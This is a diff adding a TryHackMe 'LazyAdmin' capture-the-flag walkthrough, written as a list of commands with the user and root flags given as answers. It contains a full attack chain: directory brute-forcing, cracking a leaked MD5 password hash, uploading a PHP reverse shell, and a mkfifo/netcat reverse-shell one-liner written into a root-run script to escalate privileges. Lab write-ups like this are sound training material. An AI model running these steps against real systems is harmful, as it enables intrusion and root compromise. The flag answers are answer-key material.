@@ -1,0 +1,39 @@
+
+							      LazyAdmin
+							   ===============
+
+1. What is the user flag?
+ans: THM{63e5bce9271952aad1113b6f1ac28a07} 
+command: nmap -sC -sV 10.10.148.95 -o nmap.txt
+command: gobuster dir -u 10.10.148.95 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
+command: gobuster dir -u 10.10.148.95/content --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster2.txt
+	 (go to 10.10.148.95/content and download sql file)
+command: cat mysql_bakup_20191129023059-1.5.1.sql | grep "pass" (here you got username and pass-hash) 
+	  (manager:42f749ade7f9e195bf475f37a44cafcb (hash))
+command: nano hash.txt
+command: john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt (Password123)
+	 (login with credentials to 10.10.148.95/content/as) (manager:password123)
+	 (go to media center)
+command: cp ~/Documents/scripts/reverse_shells/php_shell.php
+command: nano php_shell.php (modify your script)
+command: mv php_shell.php php_sell.phtml
+	 (upload shell)
+command: nc -nvlp 4444
+ 	 (go to http://{ip}/content/attechment and open file)
+command: python -c 'import pty;pty.spawn("/bin/bash")'
+command: cd /home/itguy
+command: cat user.txt
+
+2. What is the root flag?
+ans: THM{6637f41d0177b6f37cb20d775124699f}
+command: sudo -l (NOPASSWD: /usr/bin/perl /home/itguy/backup.pl)
+command: ls -al (-rw-r--r-x means owned by root but read by user)
+command: cat /home/itguy/backup.pl (read script)
+command: ls -al /etc/copy.sh (-rw-r--rwx means we can write this file)
+command: cat /etc/copy.sh
+command: echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.43.114 5555 >/tmp/f" > /etc/copy.sh
+command: nc -nvlp 5555 (open other terminal)
+command: sudo /usr/bin/perl /home/itguy/backup.pl
+command: cat /root/root.txt (in other terminal)
+
+
